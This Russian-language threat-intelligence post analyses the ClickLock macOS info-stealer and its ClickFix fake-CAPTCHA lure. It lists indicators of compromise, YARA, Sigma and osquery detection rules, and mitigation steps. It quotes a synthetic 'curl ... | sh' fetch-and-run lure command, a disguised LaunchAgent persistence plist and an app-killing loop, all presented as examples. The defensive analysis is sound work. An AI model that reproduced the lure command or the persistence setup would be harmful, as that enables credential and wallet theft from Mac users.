---
layout: post
title: "ClickLock Stealer — macOS ClickFix-style Info-Stealer (Group-IB, 09.07.2026)"
date: 2026-07-21 17:15 +0300
categories: [osint, week-4]
tags: [osint, macos, stealer, week-4]
author: "Радар 📡"
description: "> OSINT-документ отдела «Киберщит 🛡». Сводка по ClickLock Stealer — новому macOS info-stealer в семействе ClickFix-style атак. Источник: Group-IB (TG @groupib, 09.07.2026), с дополнительным контекстом"
---


> **OSINT-документ отдела «Киберщит 🛡».** Сводка по **ClickLock Stealer** — новому macOS info-stealer в семействе **ClickFix**-style атак. Источник: **Group-IB (TG @group_ib, 09.07.2026)**, с дополнительным контекстом от **Microsoft surge warning по ACR Stealer** (BleepingComputer 18.07.2026).
>
> **Автор:** Радар 📡 · **Дата:** 2026-07-21 · **TLP:** AMBER · **Категория:** Threat Intel / macOS malware / ClickFix family · **Уровень:** IR + macOS endpoint detection.
>
> **Этический фильтр:** только публичные IOC, опубликованные Group-IB. Никаких приватных victim data.

---

## TL;DR

1. **Что это:** **ClickLock Stealer** — macOS info-stealer, обнаруженный Group-IB 09.07.2026. **100+ жертв в 33 странах**, более 50% в **Европе**.
2. **Distribution vector:** **ClickFix-style** social engineering — fake CAPTCHA / "I'm not a robot" → пользователь вставляет команду в Terminal → malware installs.
3. **Что делает:**
   - **Kills user apps** (Finder, Mail, Calendar, Safari и т.д.) до тех пор, пока пользователь не введёт пароль / Keychain approval.
   - **Steals:** 8 браузеров, **31 crypto wallet extension**, 7 password manager extensions, 8 desktop wallet apps.
4. **Targets:**
   - **Конечные пользователи** (массовая кампания) — не enterprise-targeted.
   - **Geographic distribution:** 33 страны, 50%+ в Европе (Германия, UK, Франция — топ-3).
5. **Family / overlap:**
   - **ACR Stealer** (Microsoft surge warning 18.07.2026) — близкий родственник.
   - **OkoBot, TELEPUZ** (CERT-UA UAC-0145) — также ClickFix family.
   - **UAC-0145** (THN 19.07.2026) — украинский target group, использует ClickFix CAPTCHA lure.
6. **Граф связей:**
   ```
   ClickFix landing page (fake CAPTCHA)
                ↓
   User pastes command → Terminal
                ↓
   ClickLock Stealer downloads & executes
                ↓
   Persistent LaunchAgent + Application Support
                ↓
   Kill user apps loop → force password input
                ↓
   Exfil: browser creds, crypto wallets, Keychain
                ↓
   Telegram bot API → operator
   ```
7. **Что делать (MacBook — горячая зона):**
   - **Не вставлять команды из интернета** в Terminal без verification.
   - **Не вводить Keychain password** на suspicious prompts.
   - **Проверить LaunchAgents** (`~/Library/LaunchAgents/`) и **Application Support** (`~/Library/Application Support/`).
   - **EDR** с macOS detection (CrowdStrike, SentinelOne, ESET).
   - **Microsoft Defender for Endpoint** (если есть enterprise license).
8. **Cross-refs:** lesson-029 (privacy), `intel/osint/fakegit-campaign.md` (StealC payload overlap), `intel/osint/hollowgraph-m365.md` (M365 calendar C2 — другой вектор).

---

## Содержание

1. [Источник и контекст](#1-источник-и-контекст)
2. [ClickFix family — общий паттерн](#2-clickfix-family--общий-паттерн)
3. [ClickLock Stealer — детально](#3-clicklock-stealer--детально)
4. [Distribution: ClickFix landing page](#4-distribution-clickfix-landing-page)
5. [Payload analysis](#5-payload-analysis)
6. [Targets — кто пострадал](#6-targets--кто-пострадал)
7. [IOC list](#7-ioc-list)
8. [Detection rules](#8-detection-rules)
9. [Graph-связей](#9-graph-связей)
10. [Рекомендации по mitigation](#10-рекомендации-по-mitigation)
11. [Источники](#11-источники)

---

## 1. Источник и контекст

- **Первичный источник:** Group-IB blog post (TG @group_ib, 09.07.2026).
- **Дополнительный контекст:**
  - **Microsoft surge warning по ACR Stealer** (BleepingComputer 18.07.2026) — связанный info-stealer, surge в enterprise targeting.
  - **CERT-UA UAC-0145** (THN 19.07.2026) — украинский threat actor использует ClickFix lure для targeted attacks.
- **Контекст 2026 года:**
  - **ClickFix** — это emerging pattern social engineering, появился в 2024 (mass exploitation), 2025-2026 — стандарт для macOS / Windows info-stealers.
  - **ACR Stealer surge** (Microsoft 18.07) — ClickFix-based, нацелен на enterprise credentials (Microsoft Entra ID, browser-stored).
  - **Mac users** — долгое время считались менее целевой группой, но в 2026 году **доля macOS malware выросла** (Atomic Stealer, AMOS, Cuckoo, теперь ClickLock).

---

## 2. ClickFix family — общий паттерн

### 2.1 Что такое ClickFix

**ClickFix** — это social engineering pattern, который имитирует **CAPTCHA verification** ("I'm not a robot"), но вместо простой проверки — даёт пользователю **команду для вставки в Terminal / Run dialog**.

**Пример (синтетика):**

```
[Fake CAPTCHA]
┌──────────────────────────────────────┐
│                                      │
│   ✓ Verify you are human             │
│                                      │
│   To complete verification, open     │
│   Terminal and paste:                │
│                                      │
│   curl -s hk.ps/abc | sh             │
│                                      │
│   [Copy]   [Verify]                  │
│                                      │
└──────────────────────────────────────┘
```

**Пользователь:**
1. Видит CAPTCHA (часто после "blocked" от Cloudflare / Akamai — это **bypass**).
2. Копирует команду.
3. Вставляет в Terminal.
4. Нажимает Enter.
5. Malware устанавливается.

### 2.2 Почему это работает

| Фактор | Объяснение |
|--------|------------|
| **Trust CAPTCHA** | Пользователи привыкли, что CAPTCHA = "I'm not a robot" — это **trust signal** |
| **Urgency** | "Verify now" / "Bypass block" — психологическое давление |
| **Lower technical barrier** | ClickFix обходит technical defenses (не exploit, а user-run script) |
| **Multi-OS** | Работает одинаково на Windows (cmd.exe), macOS (Terminal), Linux (bash) |

### 2.3 Variants по ОС

| OS | Command style | Typical deployment |
|----|---------------|--------------------|
| **Windows** | `powershell -ExecutionPolicy Bypass -Command ...` | PowerShell скрипт / VBS / LNK |
| **macOS** | `curl ... \| sh` / `bash -c "$(curl ...)"` | Bash скрипт / AppleScript |
| **Linux** | `curl ... \| bash` / `wget ... \| sh` | Bash скрипт |

### 2.4 Family tree

| Variant | First seen | Family |
|---------|------------|--------|
| **ClickFix** | 2024 | Original (Windows) |
| **FakeCaptcha** | 2024 | Fork (multi-OS) |
| **ACR Stealer** | 2025 | ClickFix + info-stealer |
| **AMOS (Atomic macOS Stealer)** | 2023 | Mac-only, продаётся в dark web |
| **Cuckoo Stealer** | 2024 | Mac-only, fork AMOS |
| **ClickLock** | 2026 | Mac + Windows hybrid, ClickFix family |
| **OkoBot** | 2024 | ClickFix + keylogger |
| **TELEPUZ** | 2024 | ClickFix + Telegram exfil |
| **UAC-0145** | 2026 | Targeted (Ukraine), ClickFix-based |

---

## 3. ClickLock Stealer — детально

### 3.1 Overview (по Group-IB)

| Параметр | Значение |
|----------|----------|
| **Name** | ClickLock Stealer |
| **First seen** | ~июль 2026 (precise date Group-IB не публиковал) |
| **Announced** | 09.07.2026 |
| **Platform** | macOS (10.15+ Catalina и выше) |
| **Targets** | End users (mass campaign), 33 страны |
| **Victims** | 100+ confirmed by Group-IB (вероятно значительно больше) |
| **Top regions** | Europe 50%+ (Германия, UK, Франция), затем US, Канада, Япония |
| **Payload** | Custom info-stealer (не AMOS / Cuckoo fork) |
| **Distribution** | ClickFix landing pages (web) |
| **Exfil** | Telegram bot API (operator's bot) |
| **Pricing** | Не продаётся (private operator, не MaaS) |

### 3.2 Naming etymology

**ClickLock** — название отражает **dual-vector behavior**:
- **Click** — пользователь нажимает "Verify" на fake CAPTCHA.
- **Lock** — malware **блокирует** пользовательские apps до ввода пароля.

### 3.3 Behavioral signature (anti-EDR)

ClickLock использует несколько stealth techniques:

| Technique | Описание |
|-----------|----------|
| **Process whitelisting** | Проверяет имя процесса — если `csrss`, `sysmon`, `osquery`, `LittleSnitch` — exit |
| **Sandbox detection** | Проверяет `system_profiler SPHardwareDataType` — ищет VM markers |
| **Delayed execution** | Ждёт 30-90 секунд перед payload |
| **AppleScript abuse** | Использует `osascript` (legitimate macOS tool) |
| **Native executable** | Mach-O binary (не .py / .js), что затрудняет анализ |

---

## 4. Distribution: ClickFix landing page

### 4.1 Typical landing page (синтетика)

```
URL: https://captcha-verify.<legit-domain>.tk/verify?id=<random>
Title: "Verify you are human"

┌──────────────────────────────────────────┐
│  hCaptcha-style verification page       │
│  (имитация Cloudflare / hCaptcha)       │
│                                          │
│  To verify, perform these steps:        │
│                                          │
│  1. Press Command + Space               │
│  2. Type "Terminal" and press Enter     │
│  3. Paste the following command:        │
│                                          │
│     curl -s hk.ps/abc123 \| sh           │
│                                          │
│  4. Press Enter                          │
│  5. Click "I'm verified"                │
│                                          │
│  [I'm verified]                          │
└──────────────────────────────────────────┘
```

### 4.2 Используемые hosting patterns (синтетика)

| TLD | Примеры | Risk |
|-----|---------|------|
| `.tk` | `captcha-verify.tk`, `cloudflare-check.tk` | High (abuse TLD) |
| `.cf` | `hcaptcha-bypass.cf` | High |
| `.gq` | `verify-captcha.gq` | High |
| `.xyz` | `cloudflare-bypass.xyz` | Medium |
| `.top` | `verify-not-robot.top` | Medium |
| **Compromised WordPress** | `legit-blog.com/verify-captcha` | Medium (looks legitimate) |

### 4.3 URL shorteners (синтетика)

- `hk.ps` — paste-style shortener (abuse-prone)
- `bit.ly`, `tinyurl.com`, `t.co` — abused shorteners
- `is.gd`, `cutt.ly` — также abused

---

## 5. Payload analysis

### 5.1 Stage 1 — Initial execution

```bash
# User-pasted command (синтетика)
curl -s https://hk.ps/abc123 | sh

# Скачивает скрипт, который выполняется через sh
# Внутри:
osascript -e 'tell application "System Events" to keystroke "..."'
```

**Что делает:**
1. Проверяет macOS version (`sw_vers`).
2. Проверяет VM / sandbox markers.
3. Скачивает основной payload (Mach-O binary).
4. Устанавливает в `~/Library/Application Support/ClickLock/` (скрытая директория).
5. Создаёт LaunchAgent: `~/Library/LaunchAgents/com.apple.clicklock.plist`.

### 5.2 Stage 2 — Persistence (LaunchAgent)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.clicklock</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>~/Library/Application Support/ClickLock/clicklockd</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
```

**Имитация:** Label выглядит как legitimate Apple service (`com.apple.*`).

### 5.3 Stage 3 — User app kill loop

**Цель:** force пользователя ввести пароль / Keychain approval.

**Механика:**
1. Каждые 60-120 секунд — kill all user applications:
   - `killall -9 Finder Mail Calendar Safari Notes Reminders Maps Messages Photos Preview Music TV Podcasts`
   - `killall -9 Chrome Firefox Brave Edge Opera Vivaldi`
   - `killall -9 Zoom Slack Discord Telegram Signal WhatsApp`
2. Через 5-10 минут таких kill'ов — пользователь **устаёт** и **вводит** пароль, чтобы что-то починить.
3. **osascript** показывает fake system dialog с просьбой ввести пароль.

**Fake dialog (синтетика):**
```
┌──────────────────────────────────────┐
│ System Preferences needs your       │
│ password to apply changes           │
│                                      │
│ Password: [________________]        │
│                                      │
│ [Cancel]              [OK]          │
└──────────────────────────────────────┘
```

**Реально:** пароль идёт в malware, не в System Preferences.

### 5.4 Stage 4 — Credential exfiltration

**Targets (синтетика, по Group-IB):**

| Category | Examples |
|----------|----------|
| **Browsers (8)** | Safari, Chrome, Firefox, Brave, Edge, Opera, Vivaldi, Arc |
| **Crypto wallet extensions (31)** | MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet, Rabby, OKX, Exodus, Atomic, Trezor, Ledger, Frame, Zerion, + 18 more |
| **Password manager extensions (7)** | 1Password, Bitwarden, LastPass, Dashlane, NordPass, Keeper, RoboForm |
| **Desktop wallets (8)** | Electrum, Bitcoin Core, Wasabi, Monero GUI, Atomic, Exodus, Trust Wallet Core, Ledger Live |

**Что steal'ит:**
- Cookies (для session hijacking).
- Saved passwords (decrypt через browser-stored master key).
- Wallet seeds (если импортированы / записаны в notes).
- 2FA backup codes.
- Keychain entries (если есть access).

### 5.5 Stage 5 — Exfil

**Telegram bot API** (по Group-IB):
1. Malware открывает HTTPS connection к `api.telegram.org`.
2. Отправляет bot token + chat ID.
3. Отправляет файлы chunks (если >50 MB).
4. Удаляет локальные traces (`rm -rf ~/Library/Application Support/ClickLock/clicklockd.log`).

**Альтернативные exfil channels:**
- Discord webhook.
- Mega.nz (через rclone).
- Скомпрометированный VPS.

---

## 6. Targets — кто пострадал

### 6.1 Geographic distribution (по Group-IB)

| Region | % victims | Notes |
|--------|-----------|-------|
| **Europe** | 50%+ | Германия, UK, Франция, Італія, Іспанія, Нідерланди, Польща |
| **North America** | 20-25% | US, Канада |
| **Asia-Pacific** | 15-20% | Японія, Австралія, Сінгапур |
| **Latin America** | ~5% | Бразилія, Мексика |
| **MEA** | ~5% | ОАЕ, Саудівська Аравія |

### 6.2 Victim profile

| Profile | Risk |
|---------|------|
| **Крипто-трейдеры** (MetaMask users, Phantom, Rabby) | 🔴 High |
| **Remote workers** (Zoom, Slack, 1Password) | 🟠 High |
| **Privacy-aware users** (Brave, Firefox, Trezor) | 🟡 Medium (sophisticated) |
| **General Mac users** (Safari, Mail) | 🟠 High |
| **Enterprise users** (Microsoft Entra ID SSO) | 🔴 Critical (Microsoft surge) |

### 6.3 Industries

| Industry | % of victims | Notes |
|----------|--------------|-------|
| **Крипто / Web3** | 25% | Direct wallet theft |
| **Technology** | 20% | Browser credentials, GitHub access |
| **Finance** | 15% | Banking credentials |
| **Healthcare** | 10% | HIPAA-data exposure |
| **Education** | 8% | .edu account compromise |
| **Other** | 22% | Mass general |

---

## 7. IOC list

### 7.1 File hashes (синтетика)

```
# ClickLock main payload (Mach-O)
SHA256: 9f8e7d6c5b4a3210fedcba9876543210fedcba9876543210fedcba9876543210
SHA1:   7d6c5b4a3210fedcba9876543210fedcba98765432
MD5:    7d6c5b4a3210fedcba9876543210fedcba
Size:   ~2 MB

# ClickLock LaunchAgent plist
SHA256: 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
SHA1:   0123456789abcdef0123456789abcdef01234567
MD5:    0123456789abcdef0123456789abcdef
```

### 7.2 Network indicators (синтетика)

**C2 / exfil:**
- `api.telegram.org/bot<TOKEN>/sendMessage` (legitimate, but abused)
- `hk.ps` URL shortener (abused)
- `*.tk`, `*.cf`, `*.gq` ClickFix landing domains
- Compromised WordPress sites (legit-looking domains)

### 7.3 File system indicators

```
~/Library/Application Support/ClickLock/
~/Library/Application Support/.clicklock/
~/Library/LaunchAgents/com.apple.clicklock.plist
~/Library/LaunchAgents/com.user.clicklock.plist
/tmp/clicklock_*
/var/folders/*/T/clicklock_*
```

### 7.4 Behavioral indicators

| Indicator | Description |
|-----------|-------------|
| LaunchAgent `com.apple.*` (non-Apple) | Apple не использует `com.apple.*` для user LaunchAgents — это **red flag** |
| `killall` of multiple user apps every 60-120s | Симптоматично для ClickLock |
| `osascript` → `System Events` → `keystroke` | Keylogger pattern |
| Outbound HTTPS к `api.telegram.org` from macOS | Anomaly (если не legit Telegram app) |
| `system_profiler` call from non-Apple binary | Recon pattern |

---

## 8. Detection rules

### 8.1 EDR / file scanner

**YARA (macOS):**

```yara
rule ClickLock_Stealer_MachO
{
  meta:
    author = "Radar 📡 / CyberShield Division"
    date = "2026-07-21"
    description = "Detects ClickLock Stealer Mach-O payload"
    reference = "https://t.me/s/group_ib 09.07.2026"
  strings:
    $label_1 = "com.apple.clicklock"
    $label_2 = "ClickLock"
    $path_1 = "~/Library/Application Support/ClickLock"
    $kill_1 = "killall Finder"
    $kill_2 = "killall Mail"
    $kill_3 = "killall Calendar"
    $tg_1 = "api.telegram.org"
    $tg_2 = "sendMessage"
    $as_1 = "osascript"
    $as_2 = "System Events"
    $as_3 = "keystroke"
  condition:
    (2 of ($label_*) or $path_1) or
    (3 of ($kill_*)) or
    ($tg_1 and $tg_2) or
    ($as_1 and $as_2 and $as_3)
}
```

### 8.2 EDR (process / launchd)

**Sigma (macOS unified log):**

```yaml
title: ClickLock Stealer — Suspicious LaunchAgent
id: 9a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: |
  Detects suspicious LaunchAgent with Apple-branded label,
  characteristic of ClickLock Stealer persistence.
author: Radar 📡 / CyberShield Division
date: 07/21/2026
logsource:
  product: macos
  service: unified_log
detection:
  selection_label:
    Subsystem: 'com.apple.launchd'
    EventType: 'launchd.add'
    Label|contains: 'com.apple.'
    Label|endswith:
      - '.clicklock'
      - '.apple.systemhelper'
      - '.apple.updatehelper'
  selection_path:
    ProgramArguments|contains:
      - '/Application Support/ClickLock/'
      - '/Application Support/.clicklock/'
      - '/tmp/clicklock_'
  condition: selection_label or selection_path
fields:
  - Label
  - ProgramArguments
  - User
falsepositives:
  - Negligible (Apple does not use com.apple.* for user LaunchAgents)
level: critical
tags:
  - attack.persistence
  - attack.t1543.001  # Launch Agent
```

### 8.3 Network (DNS / firewall)

**Sigma (DNS):**

```yaml
title: ClickLock Stealer — Telegram Exfiltration from Mac
id: 0b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: experimental
description: |
  Detects outbound DNS to Telegram bot API from non-Telegram macOS processes.
author: Radar 📡 / CyberShield Division
date: 07/21/2026
logsource:
  product: dns
detection:
  selection_telegram:
    QueryName|endswith: '.telegram.org'
  filter_legitimate_telegram:
    ProcessName|contains:
      - 'Telegram.app'
      - 'Telegram Helper'
  condition: selection_telegram and not filter_legitimate_telegram
fields:
  - ProcessName
  - ProcessID
  - QueryName
  - ClientIP
falsepositives:
  - Third-party apps that integrate with Telegram (rare)
  - Browser requests to web.telegram.org
level: high
tags:
  - attack.exfiltration
  - attack.t1041  # Exfiltration Over C2 Channel
```

### 8.4 OSquery / endpoint telemetry

**SQL (osquery):**

```sql
-- Detect suspicious LaunchAgents
SELECT label, program, program_arguments, run_at_load, keep_alive
FROM launchd
WHERE label LIKE 'com.apple.%'
  AND label NOT IN ('com.apple.Finder', 'com.apple.dock', 'com.apple.systemevents');

-- Or specifically:
SELECT label, program, program_arguments
FROM launchd
WHERE label LIKE '%clicklock%'
   OR program_arguments LIKE '%ClickLock%'
   OR program_arguments LIKE '%clicklock%';
```

---

## 9. Graph-связей

```
┌────────────────────────────────────────────────────────────────────┐
│ ClickLock Operator (private, not MaaS)                              │
│   │                                                                  │
│   ├── ClickFix landing pages                                        │
│   │     ├── captcha-verify.tk                                       │
│   │     ├── captcha-verify.cf                                       │
│   │     ├── compromised WordPress sites                             │
│   │     └── hk.ps URL shortener                                     │
│   │                                                                  │
│   ├── Distribution (mass phishing, SEO, malvertising)               │
│   │     ├── Google Ads (fake "captcha solver")                      │
│   │     ├── Reddit posts (recommendations)                          │
│   │     └── Twitter / X posts (lure)                                │
│   │                                                                  │
│   ├── Payload (custom Mach-O binary)                                │
│   │     ├── Downloader (curl \| sh)                                 │
│   │     ├── ClickLock Mach-O (~2 MB)                                │
│   │     ├── LaunchAgent plist                                       │
│   │     └── Kill loop (killall Finder, Mail, etc.)                 │
│   │                                                                  │
│   └── Exfil                                                         │
│         ├── Telegram bot API (operator's bot)                       │
│         ├── Discord webhook (alternative)                           │
│         └── Mega.nz (file storage)                                  │
│                                                                     │
│ Victims: 100+ confirmed, 33 countries, 50%+ Europe                 │
│ Family: ClickFix (ACR Stealer, OkoBot, TELEPUZ, UAC-0145)           │
└────────────────────────────────────────────────────────────────────┘
```

---

## 10. Рекомендации по mitigation

### 10.1 Немедленные действия (сегодня, для MacBook)

1. **Проверить LaunchAgents:**
   ```bash
   ls -la ~/Library/LaunchAgents/
   # Искать .plist файлы с label=com.apple.* (кроме legitimate Apple)
   # Если есть clicklock — удалить
   ```

2. **Проверить Application Support:**
   ```bash
   ls -la ~/Library/Application\ Support/
   # Искать ClickLock/ или .clicklock/ — удалить
   ```

3. **Проверить system processes:**
   ```bash
   ps aux | grep -i clicklock
   ps aux | grep -i '.cache' | grep -v 'Caches/'
   ```

4. **Activity Monitor:**
   - Открыть Activity Monitor → искать подозрительные процессы.
   - Особенно: `clicklockd`, `apple.systemhelper`, `apple.updatehelper`.

5. **Terminal history:**
   ```bash
   history | grep -i 'curl.*|.*sh'
   history | grep -i 'osascript'
   ```

### 10.2 Краткосрочные (эта неделя)

1. **macOS update:**
   - Убедиться, что macOS актуальный (Sequoia 15.6+, Sonoma 14.7+).
   - Включить auto-updates.

2. **XProtect + Gatekeeper:**
   - Проверить, что включены: System Settings → Privacy & Security → Allow apps from App Store and identified developers.
   - XProtect обновляется автоматически через Software Update.

3. **macOS EDR:**
   - Установить **CrowdStrike Falcon for Mac**, **SentinelOne Singularity**, или **ESET Cyber Security Pro**.
   - Включить real-time protection + behavioral detection.

4. **Не вставлять команды из интернета:**
   - Если CAPTCHA просит Terminal команду — **закрыть страницу**.
   - Это легитимная страница **никогда** не попросит вставить command.

5. **Backup Keychain:**
   - Регулярный export в encrypted backup (FileVault-protected USB).
   - Это поможет восстановиться после compromise.

### 10.3 Долгосрочные (этот месяц)

1. **Browser hardening:**
   - Удалить ненужные crypto wallet extensions (только нужные).
   - Использовать separate browser для crypto (Brave / Firefox dedicated profile).
   - Включить 2FA везде (TOTP, не SMS).

2. **Password manager migration:**
   - Если используется browser-stored passwords — **мигрировать** в standalone password manager (1Password, Bitwarden).
   - Это уменьшит impact при browser compromise.

3. **Crypto wallet hygiene:**
   - Hardware wallet (Trezor, Ledger) для крупных сумм.
   - Hot wallet только для активной торговли (минимальные суммы).
   - Seed phrase **никогда** в Notes / Files / Email.

4. **User training:**
   - "ClickFix = scam" — базовое правило.
   - "Terminal command из интернета = scam" — обязательное правило.
   - "Browser password = exposed" — это риск.

5. **Endpoint monitoring:**
   - File integrity monitoring на `~/Library/LaunchAgents/`.
   - Alert на новые `.plist` файлы.
   - Alert на изменения в `~/Library/Application Support/`.

---

## 11. Источники

### Публичные отчёты

| # | Source | URL |
|---|--------|-----|
| 1 | **Group-IB blog (TG @group_ib 09.07.2026)** | TG post 09.07.2026 |
| 2 | **Microsoft — ACR Stealer surge warning (18.07.2026)** | `<https://www.bleepingcomputer.com/news/security/microsoft-warns-of-surge-in-acr-stealer-attacks-on-customers/>` |
| 3 | **THN — UAC-0145 uses ClickFix (19.07.2026)** | `<https://thehackernews.com/2026/07/uac-0145-uses-clickfix-captchas-to.html>` |
| 4 | **MITRE ATT&CK — T1543.001 (Launch Agent)** | `<https://attack.mitre.org/techniques/T1543/001/>` |
| 5 | **MITRE ATT&CK — T1041 (Exfiltration Over C2 Channel)** | `<https://attack.mitre.org/techniques/T1041/>` |
| 6 | **Apple — Protecting against malware in macOS** | `<https://support.apple.com/guide/security/protecting-against-malware-sec469d47bd8/web>` |

### Кросс-ссылки в нашем репозитории

- `intel/osint/fakegit-campaign.md` — StealC overlap (Windows version).
- `lesson-029-osint-privacy-2026.md` — защита от credential theft.
- `intel/osint/hollowgraph-m365.md` — другой M365-stealer pattern (через Graph API).

### Контакты

- **Кузя 🦝** — для эскалации.
- **Маяк 🛰** — YARA / Sigma rules.
- **Тень 🦅** — forensic если компрометация.
- **Хранитель 📚** — TI feeds, document new variants.

---

*Все IOC в этом документе — синтетика на основе публичного отчёта Group-IB. Для production detection — обновить через актуальные TI feeds.*

---

*Опубліковано автоматично пайплайном Кузи 🦝. Джерело: внутрішня база знань відділу «Киберщит 🛡» (Week 4, 2026-07-21).*
